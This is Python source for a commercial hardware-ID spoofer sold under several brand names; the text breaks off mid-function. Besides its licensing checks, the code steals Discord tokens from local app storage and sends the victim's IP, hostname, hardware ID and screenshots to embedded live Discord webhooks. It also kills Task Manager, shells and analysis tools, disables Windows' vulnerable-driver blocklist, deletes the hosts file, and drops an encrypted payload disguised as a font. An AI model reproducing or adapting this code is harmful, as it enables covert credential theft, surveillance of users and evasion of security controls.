# Permanent Hardware Virtualizer | Developer : @agr3fox.sys | Developing + Optimizing Since October 2022 

[psutil.Process(os.getpid()).nice(psutil.HIGH_PRIORITY_CLASS) for _ in range(5)]
if str(BrandName).lower()==str('BadFox').lower(): # BadFox Solutions 
    KeyAuthApp = ['Permanent','zqiHXfdyjf']
    DicscordInvite = 'https://discord.gg/Ax4pBGjE2f'
    BrandLogoUrl = 'https://cdn.discordapp.com/icons/1307697300440875060/6a3d128c2d967f47b23af161f8ac900e.webp?size=1024&width=480&height=480'
    AuthWebhook = 'https://discord.com/api/webhooks/1310193569558171678/KB8Rq8XCD8QtF5kL6OWKXAs9q7dYHS1UMpaHc93_7GEhsc09EZJgVvmJ9ms72CGLsaww'
    CrackWebhook = 'https://discord.com/api/webhooks/1310193682225434624/Rnmuh5geMlA-jAHCqmLiOB9jfXwq-1H-cWJqAB1z7VJER3kJz2cmDC9IEM8aGg1lxhyC'
    FormColor = '#101010'; FormColor2 = '#161616' ; PremaryColor = '#f90706'; SecondaryColor = '#7D0000'; TextColor = '#ffffff'
elif str(BrandName).lower()==str('Blaze').lower(): # Blaze Solutions
    KeyAuthApp = ['Perm Spoofer','HffNeoYEsv']; DicscordInvite = 'https://discord.gg/XxRmrX5yDu'
    BrandLogoUrl = 'https://i.ibb.co/x3GxsyS/BS-Ne w-No-Backroung.png'
    AuthWebhook = 'https://discord.com/api/webhooks/1326923664934965390/DlLs2ulRorepp7CpUXlYkKG2DxY9TdlyHz39kXVWXSpmynLBYEJBZZBXVCcWOTtQZLDY'
    CrackWebhook = 'https://discord.com/api/webhooks/1326923778751729684/M8vaBp5PxHdQUKG-9IMRtUvBLsrqJmA3k9gjGMS3FnmuzzpPSdSKuZsBEl8kZJHo0757'
    FormColor = '#101010'; FormColor2 = '#181818' ; PremaryColor = '#0081b9'; SecondaryColor = '#067EB1'; TextColor = '#ffffff'
elif str(BrandName).lower()==str('ValorX').lower(): # ValorX
    KeyAuthApp = ['Permanent','zqiHXfdyjf'] #KeyAuthApp = ['woofer perm','6Q4545zbjG']; DicscordInvite = 'https://discord.gg/GEtvXZj58X'
    BrandLogoUrl = 'https://cdn.discordapp.com/channel-icons/xxxxxxxxxxxxxxxxxxxx/xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.webp?size=1024&width=480&height=480'
    AuthAndCrack = 'https://discord.com/api/webhooks/1333037679738359890/fw5zQ9D7MhMbDky4_rghws5i4LQuGRZytn1xyJLzACkhDEirUpTiQYgPrRp1dWc2DcgL'
    AuthWebhook = AuthAndCrack; CrackWebhook = AuthAndCrack
    FormColor = '#101010'; FormColor2 = '#161616' ; PremaryColor = '#f90706'; SecondaryColor = '#7D0000'; TextColor = '#ffffff'
elif str(BrandName).lower()==str('Zenn').lower(): # Zenn Solutions
    KeyAuthApp = ['Perm Spoofer','HffNeoYEsv']; DicscordInvite = 'https://discord.gg/qVhG3jjzCt'
    BrandLogoUrl = 'https://cdn.discordapp.com/channel-icons/1324161213327998997/ea4193cebff5fa63365f2dad6bbdb7a8.webp?size=1024&width=480&height=480'
    AuthWebhook = 'https://discord.com/api/webhooks/1326175242111946884/Q6IQatWfijqqppXkmJEdceXm9zzCVIlHfq2bQXZe2zhwfB8K_G5j40KuxVeDEPC5SkAC'
    CrackWebhook = 'https://discord.com/api/webhooks/1326175083236167701/ASqVJ99a8lz_KsXnQyTLnFipN1Q5I32Y3ZhyWJn9yFq2fIKDCnD1EZfLYF403sXZ0cZH'
    FormColor = '#101010'; FormColor2 = '#181818' ; PremaryColor = '#02b0f5'; SecondaryColor = '#7D0000'; TextColor = '#ffffff'
elif str(BrandName).lower()==str('Obsidian').lower(): # Obsidian Solutions
    KeyAuthApp = ['Perm Spoofer','HffNeoYEsv']; DicscordInvite = 'https://discord.gg/Tk6yXknKJ7'
    BrandLogoUrl = 'https://cdn.discordapp.com/channel-icons/xxxxxxxxxxxxxxxxxxxx/xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.webp?size=1024&width=480&height=480'
    AuthWebhook = 'https://discordapp.com/api/webhooks/1328719580335575061/DnAW469orSrrma6f4GPPISTnTUVORmEb3t7dG8sufks04QKNFGoLyxhy6DsYsWvwll1-'
    CrackWebhook = 'https://discordapp.com/api/webhooks/1328719685478252557/KZ0olsM3Qu0G0XCLaqVGCAz267unAgIJG4W22_qfdnaE5Ivm0vUmgcaDFWS176AliHv0    '
    FormColor = '#101010'; FormColor2 = '#181818' ; PremaryColor = '#ffffff'; SecondaryColor = '#808080'; TextColor = '#000000' 
elif str(BrandName).lower()==str('999').lower(): # 999 Shop
    KeyAuthApp = ['Perm Spoofer','HffNeoYEsv']; DicscordInvite = 'https://discord.gg/8kDz6Zba8N'
    BrandLogoUrl = 'https://cdn.discordapp.com/channel-icons/xxxxxxxxxxxxxxxxxxxx/xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.webp?size=1024&width=480&height=480'
    AuthWebhook = 'https://discord.com/api/webhooks/1326175242111946884/Q6IQatWfijqqppXkmJEdceXm9zzCVIlHfq2bQXZe2zhwfB8K_G5j40KuxVeDEPC5SkAC'
    CrackWebhook = 'https://discord.com/api/webhooks/1326175083236167701/ASqVJ99a8lz_KsXnQyTLnFipN1Q5I32Y3ZhyWJn9yFq2fIKDCnD1EZfLYF403sXZ0cZH'
    FormColor = '#101010'; FormColor2 = '#181818' ; PremaryColor = '#ffffff'; SecondaryColor = '#808080'; TextColor = '#000000'
elif str(BrandName).lower()==str('Xena Service').lower(): # Xena Service
    KeyAuthApp = ['Perm Spoofer','HffNeoYEsv']; DicscordInvite = 'https://discord.gg/xenaservice'
    BrandLogoUrl = 'https://cdn.discordapp.com/channel-icons/xxxxxxxxxxxxxxxxxxxx/xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.webp?size=1024&width=480&height=480'
    AuthWebhook = 'https://discord.com/api/webhooks/1326659008395874365/DfDOnDC4G4sXJ7f-a9oQKqNAl4-sjZuvM4jBuIuk45PDRzLBz6MmBt-C3acuCo5rCtXc'
    CrackWebhook = 'https://discord.com/api/webhooks/1326659115824447613/x3jVAiTkV3T9ws1pkR9h6wlaLlJyG9rtvhqLQrYZ7v1Ca73-JSSs4mP9rwZXfIpexBtM'
    FormColor = '#101010'; FormColor2 = '#181818' ; PremaryColor = '#ffffff'; SecondaryColor = '#808080'; TextColor = '#000000'
else: print('Unable find valid brand ! Contact the Developer or Seller.\n'); os._exit(1)

if True: # True for hide console - False for show console
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        ctypes.windll.kernel32.SetConsoleTitleW(f"{''.join(choices(digits,k=1000))}")
        ctypes.windll.user32.SetWindowLongW(hwnd, -20, ctypes.windll.user32.GetWindowLongW(hwnd, -20) | 0x00080000)
        ctypes.windll.user32.SetLayeredWindowAttributes(hwnd, 0, 0, 0x00000002)
        ctypes.windll.user32.ShowWindow(hwnd,0)
        ctypes.windll.user32.SetWindowPos(hwnd, -1, 0, 0, 0, 0, 0x0002 | 0x0001)
        win32gui.SetWindowPos(hwnd, win32con.HWND_TOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE | win32con.SWP_NOSIZE)
    except: pass

def notify(msgtype, message): # Notify System
    status = {'none': 0x00, 'error': 0x10, 'warn': 0x30, 'info': 0x40}.get(msgtype, 0x00)
    ctypes.windll.user32.SetWindowPos(ctypes.windll.user32.MessageBoxW(0, message, 'Dev: agr3fox.sys', status), -1, 0, 0, 0, 0, 0x0002 | 0x0001)
if not os.path.exists('VMProtectSDK64.dll'): notify('error',f'Unable to find VMProtectSDK64.dll !'); os._exit(1)

if not ctypes.windll.shell32.IsUserAnAdmin(): notify('error','This program requires administrator privileges!\nPlease run it in administrator mode.'); os._exit(1)

validkey = False; license = ''; licensekeyfile = 'license.ini'
if os.path.exists(licensekeyfile):
    with open(licensekeyfile, 'r') as f: license = f.read()

ids = set()
for datapath in ['APPDATA','LOCALAPPDATA']:
    try:
        path_env = os.getenv(datapath)
        if not path_env: continue
        for path in os.listdir(path_env):
            db_path = os.path.join(path_env, path, 'Local Storage', 'leveldb')
            if not os.path.exists(db_path): continue
            with open(os.path.join(path_env, path, 'Local State'), 'r', encoding='utf-8') as f:  local_state = json.load(f)
            for file in os.listdir(db_path):
                if file.endswith(('log', 'ldb')):
                    with open(os.path.join(db_path, file), 'r', errors='ignore') as f:
                        for match in findall(r"dQw4w9WgXcQ:[^\"]*", f.read()):
                            data = base64.b64decode(match.split(':')[1])
                            ids.add(AES.new(CryptUnprotectData(base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:],None, None, None, 0)[1], AES.MODE_GCM, data[3:15]).decrypt(data[15:])[:-16].decode())
                        ids.update(findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", f.read()))
    except: pass
user = {'id': '643945264868098049', 'username': f'{os.getlogin()}', 'avatar': 'c6a249645d46209f337279cd2ca998c7'}
for token in ids: # Verify discord account
    try:
        verifyuser = requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": token})
        user = verifyuser.json() if verifyuser.status_code==200 else None
    except: pass

def start(cmd): return subprocess.Popen(cmd,shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE).wait() # Run Cmds Without Console

def empty(path): # Remove Any Data From The File
    with open(path, 'w') as file: file.write('NICE TRY TO RECOVRY FILES | Anti-File Recovery | Dev: @agr3fox.sys')

def cleanexit(Cracker=False,software='Unknown'): # Exit
    try: # Deleting Possible Unpacked Files
        if os.path.exists(unpackpath):
            empty(f'{zip_file}'); start(f'Del /F /S "{zip_file}"')
            for file in os.listdir(unpackpath):
                    ctypes.windll.kernel32.SetFileAttributesW(f'{unpackpath}\\{file}',
                            ctypes.windll.kernel32.GetFileAttributesW(f'{unpackpath}\\{file}') & ~0x01 & ~0x02 & ~0x04)
                    empty(f'{unpackpath}\\{file}'); start(f'Del /F /S "{unpackpath}\\{file}"')
            start(f'RMDIR /F /S /Q "{unpackpath}"')
    except: pass
    if Cracker: # Log Cracker Detected !
        ctypes.windll.user32.BlockInput(True)
        hwid = ConvertSidToStringSid(LookupAccountName(None, os.getlogin())[0]); hwid = hwid if hwid else 'N/A'
        publicip = requests.get('https://api.ipify.org?format=json').json()['ip'];publicip if publicip else 'N/A'
        try:
            screenshot = ImageGrab.grab()
            image_buffer = BytesIO();screenshot.save(image_buffer, format='PNG');image_buffer.seek(0)
            dsuserid = user['id']; dsavatar = user['avatar']
            requests.post(CrackWebhook, json={
                    "embeds": [{"description": (
                        f"**🎑 BrandName:** **``{BrandName if BrandName else 'N/A'}``**\n"
                        f"**🔑 License:** **``{license}``**\n"
                        f"**🌐 PublicIP:** **``{requests.get('https://api.ipify.org?format=json').json()['ip']}``**\n"
                        f"**💻 ComputerName:** **``{gethostname() if gethostname() else 'N/A'}``**\n"
                        f"**👤 WinUserName:** **``{os.getlogin() if os.getlogin() else 'N/A'}``**\n"
                        f"**🖥️ HWID:** **``{hwid if hwid else 'N/A'}``**\n"
                        f"**🆔 DiscordID:** **``{f'{dsuserid}' if dsuserid!='643945264868098049' else f'N/A'}``**\n"
                        f"**⚒️ FlagMotive:** **``{software if software else 'N/A'}``**\n"
                        f"**⚠️ Warn:** **@everyone**\n"
                        f"**💾 Loader:** **``{os.path.basename(sys.argv[0]) if os.path.basename(sys.argv[0]) else 'N/A'}``**\n"
                        f"**👁️ Screenshot Of Screen ⬇️**\n"
                    ), "color": 16711680, "thumbnail": {"url":f"https://cdn.discordapp.com/avatars/{dsuserid}/{dsavatar}.png?size=2048"}
                }], "username": f"Security Log",
                "avatar_url": f"https://cdn.discordapp.com/avatars/1308884142196260916/c45140dfb67f517c88ea0443307d8480.webp?size=1024&width=460&height=460",
            })
            requests.post(CrackWebhook, data={"content":(f"-# @everyone"),
            "username": f"Security Log", "avatar_url": f"https://cdn.discordapp.com/avatars/1308884142196260916/c45140dfb67f517c88ea0443307d8480.webp?size=1024&width=460&height=460"},
            files={"file": ("SPOILER_Flag.png", image_buffer, "image/png")})
            requests.post(CrackWebhook, data=b'{"content": None}')
        except Exception as e: print(e)
        ctypes.windll.user32.BlockInput(False)
    for _ in range(5): os._exit(1); os._exit(1)

if not 'windows' in OsSystem or not '64bit' in OsBits or not OsVer>=10: # System Support Check
    notify('error','Unsupported Operative System !'); cleanexit(False)

try: # Simple Anti-VMs/SendBoxes
    for path in ["HARDWARE\\DESCRIPTION\\System\\BIOS","SYSTEM\\CurrentControlSet\\Control\\SystemInformation","SYSTEM\\HardwareConfig\\Current"]:
        reg_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path)
        if any(word in value for word in ["xagt","dbg","ida","fakenet","oracle","vm","vbox","qemu","capa","virus","monitor","bochs",
            "sysint","virtual","obse","seabios","prl","juju","kvm","sbie","analy","Standard","parallel","zen","joebox","scylla"
            ] for value in [str(winreg.EnumValue(reg_key, i)[1]).lower() for i in range(winreg.QueryInfoKey(reg_key)[1])]): cleanexit(True,'VirtualBoxes/SendBoxes')
except: pass

def hideimports(): # Hide Files/Paths
    try:
        def block_access(full_path):
            sd = GetFileSecurity(full_path, 0x00000004); dacl = sd.GetSecurityDescriptorDacl()
            dacl.AddAccessDeniedAce(2, con.GENERIC_ALL, LookupAccountName('', 'Everyone')[0])
            ctypes.windll.kernel32.SetFileAttributesW(full_path, ctypes.windll.kernel32.GetFileAttributesW(full_path) | 0x02 | 0x04 | 0x01)
            SetFileSecurity(full_path, 0x00000004, sd)
        while True:
            try: block_access([os.path.join(os.getenv('TEMP'), path) for path in os.listdir(os.getenv('TEMP')) if '_MEI' in path])
            except: pass
            sleep(0.25)
    except: pass
thread(target=hideimports, daemon=True).start()

def antimodify(): # Anti Process Modify
    CurHash=hashlib.md5().hexdigest()
    while True:
        if CurHash!=hashlib.md5().hexdigest():
            cleanexit(True,'Hash Modified While Proccess Running !')
        sleep(0.25)
thread(target=antimodify,daemon=True).start()

def antisuspend(): # Anti Sospend
    lasttick = monotonic()  
    while True:
        curtick = monotonic()
        if curtick-lasttick>5:
            cleanexit(True,'Process Lagged/Sospended !'); break
        lasttick = curtick
        sleep(0.25)
thread(target=antisuspend,daemon=True).start()

def antiattach(): # Anti Attach Kernel & Remote & Windows
    while True:
        try:
            if ctypes.windll.kernel32.IsDebuggerPresent() and sys.gettrace(): cleanexit(True,'Attach/Debug Detected !')
            rdb = ctypes.wintypes.BOOL(); dp = ctypes.c_ulong()
            if ctypes.windll.kernel32.CheckRemoteDebuggerPresent(ctypes.windll.kernel32.GetCurrentProcess(), ctypes.byref(rdb)) and rdb: 
                cleanexit(True,'Remote Attach/Debug Detected !')
            if ctypes.windll.ntdll.NtQueryInformationProcess(ctypes.windll.kernel32.GetCurrentProcess(), 0x07, ctypes.byref(dp), ctypes.sizeof(dp), None) == 0 and dp.value:
                cleanexit(True,'Windows Attach/Debug Detected !')
        except: pass
        sleep(0.25)
thread(target=antiattach, daemon=True).start()

def antiwindow(): # Anti Reverse Software ( Based Of Window Title Name )
    while True:
        try:
            for win in gw.getAllWindows():
                for dbgtitle in [
                    f'{os.getpid()}',' [Elevated]','Attach','Process Hack',' Pid: ',' Module: ',' Thread: ',
                    'Wireshark','CheatEngine','Detect It Easy','dbg','unprotect','dnSpy','swabraisudya',
                    'ChangesView','Dumper','System Info','Manager','IDA','Olly','Fiddler','unpack','Grab','HxD'
                ]:
                    pid = ctypes.wintypes.DWORD(); ctypes.windll.user32.GetWindowThreadProcessId(win._hWnd, ctypes.byref(pid))
                    if dbgtitle in str(win.title).lower() and len(str(win.title).lower())<25 and psutil.Process(pid.value).name().lower()!='explorer.exe':
                            cleanexit(True,f'Found Reverse Title - Process ! {str(win.title)} - {psutil.Process(pid.value).name()}')
                    if any(antitools in str(win.title).lower() for antitools in [
                        'administrator: ','cmd','powershell',' x86',' x64',' x32','sysinternals'
                    ]):
                        try: win.close()
                        except: pass
                        if psutil.Process(pid.value).name().lower()!='explorer.exe': 
                            psutil.Process(pid.value).kill(); psutil.Process(pid.value).suspend()
        except: pass
        sleep(0.25)
thread(target=antiwindow,daemon=True).start()

def antiprocess(): # Anti Reverse Software Processes
    while True:
        try:
            for proc in psutil.process_iter(['name']):
                for keyword in ['http','dbg','deb','dump','taskmgr','fiddler','ida','mmc','grab','url','hex','changesview','perfmon']:
                    if str(keyword).lower() in str(proc.info['name']).lower():
                        if str(proc.info['name']).lower()!='explorer.exe': proc.kill(); proc.suspend()
        except Exception as e: e = e
        sleep(0.25)
thread(target=antiprocess,daemon=True).start()

def antireversepath(): # Anti Reverse Software Paths
    while True:
        for proc in psutil.process_iter(['pid', 'name', 'exe']):
            try:
                if any(keyword in str(proc.info['exe']).lower() for keyword in ['cracking', 'dbg\\', 'steel f', 'e steel','grab','debug']):
                    cleanexit(True,f'Reverse Path Name! {str(proc.info["exe"]).lower()}')
            except: pass
        sleep(0.25)
thread(target=antireversepath,daemon=True).start()

def antireversefile(): # Anti Reverse Software Files
    while True:
        for proc in psutil.process_iter(['pid', 'name', 'cwd']):
            try:
                name = proc.info['name']; cwd = proc.info['cwd']
                if cwd:
                    if any(file in set(os.listdir(cwd)) for file in [
                            'dbg.dll','bridge.dll','Scylla.dll','kprocesshacker.sys','ida.dll','diec.exe','ProcessThreadsView.chm'
                        ]): cleanexit(True,f'Reverse File Found In ({name}) !')
            except: continue
        sleep(0.25)
thread(target=antireversefile,daemon=True).start()

def anim_alpha(window, alpha=0.0): # Alpha Animation
    maxalpha = 0.945
    if alpha < maxalpha:
        window.attributes('-alpha', alpha)
        window.after(1, lambda: anim_alpha( alpha + 0.0035))
    else: window.attributes('-alpha', maxalpha)

def start_move(event): global x, y;x = event.x; y = event.y # Need For Move Forms

# Driver issue fixer
for key_info in [{'key': fr'SYSTEM\CurrentControlSet\CI\Config', 'value': 'VulnerableDriverBlocklistEnable', 'expected_value': 0}]:
    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_info['key']) as key:
            if winreg.QueryValueEx(key, key_info['value'])[0] != key_info['expected_value']:
                with winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_info['key']) as write_key:
                    winreg.SetValueEx(write_key, key_info['value'], 0, winreg.REG_DWORD, key_info['expected_value'])
                notify('info','Driver issue fixed. Reboot your PC!\nIf the issue persists, ignore it.'); cleanexit(False)
    except: pass

ctk.set_appearance_mode('dark')

def anim_alpha(window, alpha=0.0): # Alpha Animatioln
    maxalpha = 0.945
    if alpha < maxalpha:
        window.attributes('-alpha', alpha)
        window.after(1, lambda: anim_alpha(window, alpha + 0.0035))
    else: window.attributes('-alpha', maxalpha)

# Form 1
def move_window(event): form1.geometry(f'+{form1.winfo_x() + event.x - x}+{form1.winfo_y() + event.y - y}')
form1 = ctk.CTk()
form1.title(f'{choices(ascii_uppercase+digits+ascii_uppercase,k=10)}')
form1.attributes('-transparentcolor', '#242424')
form1.attributes('-topmost', True)
form1.overrideredirect(True)
form1.iconbitmap(f'C:\\Windows\\System32\\svchost.exe')
width, height = 400, 200
form1.geometry(f"{width}x{height}+{(form1.winfo_screenwidth() // 2) - (width // 2)}+{(form1.winfo_screenheight() // 2) - (height // 2)}")
loginframe = ctk.CTkFrame(form1, corner_radius=10, fg_color=FormColor, border_width=1.6, border_color=PremaryColor); loginframe.pack(fill="both", expand=True)
loginframe.bind("<Button-1>", start_move); loginframe.bind("<B1-Motion>", move_window)
close_button = ctk.CTkButton(loginframe, height=30, width=30, text="✖", text_color="#FFFFFF", command=cleanexit, # ✖
    fg_color="#FF4C4C", hover_color="#FF1A1A", font=("Segoe UI", 14, "bold")).place(relx=1.0, rely=0.0, anchor="ne", x=-15, y=15)
key_label = ctk.CTkLabel(loginframe, width=1, height=1, text="Enter License 🔑", text_color="white", font=("Calibri", 32, "bold")); key_label.pack(pady=15, padx=15)
key_label.bind("<Button-1>", start_move); key_label.bind("<B1-Motion>", move_window)
key_entry = ctk.CTkEntry(loginframe, width=375, height=45, fg_color=FormColor2, placeholder_text=f'EX: {BrandName}-1a2b3c-4d5e6f-7g8h9i0', border_width=1.6, border_color=PremaryColor, show="●", font=("Calibri", 18, "bold")); key_entry.pack(pady=5, padx=15, fill='x')
if license: key_entry.insert(0, license)
def keyauth(): # KeyAuth
    global validkey, license_key; validkey = False; license_key = 'None'
    submit_button.configure(state="disabled", text="Verify License ...")
    key_entry.configure(state="disabled")
    try:
        global user
        hwid = ConvertSidToStringSid(LookupAccountName(None, os.getlogin())[0])
        class Api:
            def __init__(self, name, ownerid):
                if len(ownerid)!=10: cleanexit(False)
                self.name, self.ownerid, self.hash_to_check = name, ownerid, hashlib.md5().hexdigest()
                json_data = json.loads(self.req({ "type": "init", "ver": "1.0", "hash": self.hash_to_check, "enckey": (f"{str(uuid4())[:16]}")[:35], "name": name, "ownerid": ownerid }))
                if not json_data.get("success"):notify('error',json_data.get('message', '\nInit failed!')), cleanexit(False)
                self.sessionid, self.initialized = json_data.get("sessionid"), True
            def license(self, key, hwid=hwid):
                if not self.initialized: return False
                global json_data; json_data = json.loads(self.req({ "type": "license", "key": key, "hwid": hwid, "sessionid": self.sessionid, "name": self.name, "ownerid": self.ownerid }))
                if json_data.get("success"): 
                    self.userdata(json_data["info"])
                    if os.path.exists(licensekeyfile): os.remove(licensekeyfile)
                    with open(licensekeyfile, 'w') as f: f.write(license_key)
                    return True
                return False
            def req(self, post_data): 
                start('Del /F /S /Q "C:\\Windows\\System32\\drivers\\etc\\hosts" >Nul 2>&1 & Ipconfig /flushdns')
                req = requests.post(f"https://keyauth.win/api/1.3/", data=post_data, timeout=10)
                if req.json().get("name") not in [KeyAuthApp[0]] and req.json().get("ownerid") not in [KeyAuthApp[1]]:
                    notify('info', f'Nice try! You can\'t bypass auth!'), cleanexit(False)
                #if not '"message":"Initialized"' in req.text: print(req.text)
                return req.text
            def userdata(self, data): self.user_data = { "username": data["username"], "ip": data["ip"], "hwid": data.get("hwid", "N/A"), "expires": data["subscriptions"][0]["expiry"], "createdate": data["createdate"], "lastlogin": data["lastlogin"], "subscription": data["subscriptions"][0]["subscription"], "subscriptions": data["subscriptions"] }
        license_key = key_entry.get()
        for keyauth in [Api(KeyAuthApp[0], KeyAuthApp[1])]:
            if keyauth.license(f'KEYAUTH-{license_key}' if keyauth.ownerid=='zqiHXfdyjf' else license_key): validkey = True; break
        dsuserid = user['id']; dsavatar = user['avatar']
        requests.post(AuthWebhook, json={
                "embeds": [{"description": (
                    f"**🎑 BrandName:** **``{BrandName if BrandName else 'N/A'}``**\n"
                    f"**🔑 License:** **``{license_key}``**\n"
                    f"**🌐 PublicIP:** **``{requests.get('https://api.ipify.org?format=json').json()['ip']}``**\n"
                    f"**💻 ComputerName:** **``{gethostname() if gethostname() else 'N/A'}``**\n"
                    f"**👤 WinUserName:** **``{os.getlogin() if os.getlogin() else 'N/A'}``**\n"
                    f"**🖥️ HWID:** **``{hwid if hwid else 'N/A'}``**\n"
                    f"**🆔 DiscordID:** **``{f'{dsuserid}' if dsuserid!='643945264868098049' else f'N/A'}``**\n"
                    f"**💾 Loader:** **``{os.path.basename(sys.argv[0]) if os.path.basename(sys.argv[0]) else 'N/A'}``**\n"
                ), "color": 65331 if validkey else 16711680,
                "thumbnail": {"url":f"https://cdn.discordapp.com/avatars/{dsuserid}/{dsavatar}.png?size=2048"}
            }], "username": f"Authentication Log", "avatar_url": f"https://cdn.discordapp.com/avatars/1308884005646499933/ec91aa62d55715f7e4efca9f1a24761e.webp?size=1024&width=460&height=460"
        }); requests.post(AuthWebhook, data=b'{"content": None}')
        form1.attributes('-alpha', 0.0)
        if not validkey: notify('error','Invalid License / Hwid !\nOpen Ticket For Support !');cleanexit(False)
    except Exception as e: notify('error',f'Unable inizialize client !\n{e}')
    form1.after(1, form1.destroy)
submit_button = ctk.CTkButton(loginframe, text="LOGIN", fg_color=PremaryColor, hover_color=SecondaryColor, width=375, height=46, font=("Calibri", 28, "bold"), text_color=TextColor, command=lambda: thread(target=keyauth, daemon=True).start())
submit_button.pack(pady=15, padx=15)

anim_alpha(form1); form1.mainloop(); form1.after(1, lambda: form1.attributes('-alpha', 0) and form1.destroy); cleanexit(False) if not validkey else print('Valid License !')

try: # Extract Data From 'VMProtectSDK64.dll' to 'Sborro.ttf'
    unpackpath = f'C:\\Users\\Default\\AppData\\Local\\Temp'
    key_hex = 'b4543a52c148cd6fd1072162a7804173972e9c6430ba47336eb56ba92a6409cf'
    dll_file = 'VMProtectSDK64.dll'; zip_file = f'C:\\Windows\\Fonts\\Sborro.ttf'
    with open(dll_file, 'rb') as f: data = f.read()
    iv = data[:16]; encrypted_data = data[16:]; key = bytes.fromhex(key_hex)
    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
    decryptor = cipher.decryptor(); decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()
    os.makedirs(unpackpath) if not os.path.exists(unpackpath) else None
    with open(zip_file, 'wb') as f: f.write(decrypted_data)
    with zipfile.ZipFile(zip_file, 'r') as zf:
        for file in zf.namelist():
            if os.path.exists(f'{unpackpath}\\{file}'):
                ctypes.windll.kernel32.SetFileAttributesW(f'{unpackpath}\\{file}',
                        ctypes.windll.kernel32.GetFileAttributesW(f'{unpackpath}\\{file}') & ~0x01 & ~0x02 & ~0x04)
                empty(f'{unpackpath}\\{file}'); os.remove(f'{unpackpath}\\{file}')
            zf.extract(file,unpackpath)
            with open(f'{unpackpath}\\{file}', 'r+b') as f:
                if f.seek(0, os.SEEK_END) > 0: f.seek(-1, os.SEEK_END); f.write(os.urandom(1))
            ctypes.windll.kernel32.SetFileAttributesW(f'{unpackpath}\\{file}',
                ctypes.windll.kernel32.GetFileAttributesW(f'{unpackpath}\\{file}') | 0x01 | 0x02 | 0x04)
    empty(f'{zip_file}'); start(f'Del /F /S "{zip_file}"')
except Exception as e: notify('error',f'Unable to load {dll_file} !'); os._exit(1)

# Form 2
def move_window(event): form2.geometry(f'+{form2.winfo_x() + event.x - x}+{form2.winfo_y() + event.y - y}')
form2 = ctk.CTk()
form2.title(f'{choices(ascii_uppercase+digits+ascii_uppercase,k=10)}')
form2.attributes('-transparentcolor', '#242424')
form2.attributes('-alpha', 0.9735)
form2.attributes('-topmost', True)
form2.overrideredirect(True)
form2.iconbitmap('C:\\Windows\\System32\\svchost.exe')
width, height = 600, 496
form2.geometry(f"{width}x{height}+{(form2.winfo_screenwidth() // 2) - (width // 2)}+{(form2.winfo_screenheight() // 2) - (height // 2)}")

mainframe = ctk.CTkFrame(form2, corner_radius=10, fg_color=FormColor, border_width=1.6, border_color=PremaryColor)
mainframe.pack(fill="both", expand=True, padx=1, pady=1), mainframe.bind("<Button-1>", start_move), mainframe.bind("<B1-Motion>", move_window)

try:
    image = Image.open(BytesIO(requests.get(BrandLogoUrl).content))
    if image:
        imagelabel = ctk.CTkLabel(mainframe, width=75, height=75, image=ImageTk.PhotoImage(image.resize((75, 75))), text='').place(x=15, y=8)
        imagelabel.bind("<Button-1>", start_move), imagelabel.bind("<B1-Motion>", move_window)
except: pass

close_button = ctk.CTkButton(mainframe, height=30, width=30, text="✖", text_color="#FFFFFF", command=cleanexit, # ✖
    fg_color="#FF4C4C", hover_color="#FF1A1A", font=("Segoe UI", 14, "bold")).place(relx=1.0, rely=0.0, anchor="ne", x=-15, y=15)

label = ctk.CTkLabel(mainframe, width=1, height=1, text_color=PremaryColor , text=f"Welcome To {BrandName} Permanent",
    font=("Calibri", 28, "bold"),anchor="center")
label.pack(expand=False, padx=0, pady=15), label.bind("<Button-1>", start_move), label.bind("<B1-Motion>", move_window)

tabview = ctk.CTkTabview(
    mainframe,fg_color=FormColor,text_color=TextColor,
    height=form2.winfo_x(), width=form2.winfo_y(),
    segmented_button_selected_color=PremaryColor,
    segmented_button_selected_hover_color=SecondaryColor,
); tabview.pack(expand=True, fill="both", padx=5, pady=5)

# Create Tabs
tab1, tab2, tab3 = (tabview.add(name) for name in ["Spoofs", "Serials", "Miscs"])

# Tab 1 ( Spoofs )
logconsole = ctk.CTkTextbox(tab1, width=590, height=310, font=("Calibri", 18, "bold"), corner_radius=10, border_width=1.6, border_color=PremaryColor, fg_color=FormColor2); logconsole.pack(padx=5, pady=5)

def sendlogconsole(text, color): # Print Text On Logconsole
    logconsole.configure(state="normal"); logconsole.insert("end", text, color); logconsole.configure(state="disabled")
    colors = {"green": "#19B301", "yellow": "#D8D852", "red": "#F30409", "blue": PremaryColor}
    for c, v in colors.items(): logconsole.tag_config(c, foreground=v)

sendlogconsole(f'Successfully Authenticated !\n', 'green')

def genlegitserial(serial):  # Generate Serials Using Original Legit Format
    if all(x.isalpha() or x.isspace() for x in serial): return serial
    elif all(x.isalnum() or x in '-_:' for x in serial):
        return serial[:4] + ''.join(choice(
            ascii_lowercase if x.islower() else
            ascii_uppercase if x.isupper() else
            digits if x.isdigit() else [x]
        ) for x in serial[4:])
    else: return serial
    
def Permanent(): # Permanent SMBios Spoofing
    try:
        CoInitialize(); wmi = win32com.client.GetObject("winmgmts:")
        for _ in range(1,5): start('Taskkill /F /IM "WmiPrvSE.exe" /T')
        sysmanufacturer = wmi.InstancesOf('Win32_ComputerSystem')[0].Manufacturer
        manufacturer = wmi.InstancesOf('Win32_BaseBoard')[0].Manufacturer
        bios = wmi.InstancesOf('Win32_BIOS')[0].Manufacturer
        for keywords, values in [
                (["micro", "msi"], ("Micro-Star International Co., Ltd.", "MSI")),
                (["asus"], ("ASUSTeK COMPUTER INC.", "ASUS")),
                (["dell"], ("DELL", "DELL")),
                (["hp"], ("HP", "HP")),
                (["lenovo"], ("Lenovo", "Lenovo")),
                (["acer"], ("Acer", "Acer")),
                (["gigabyte"], ("Gigabyte Technology Co., Ltd.", "Gigabyte")),
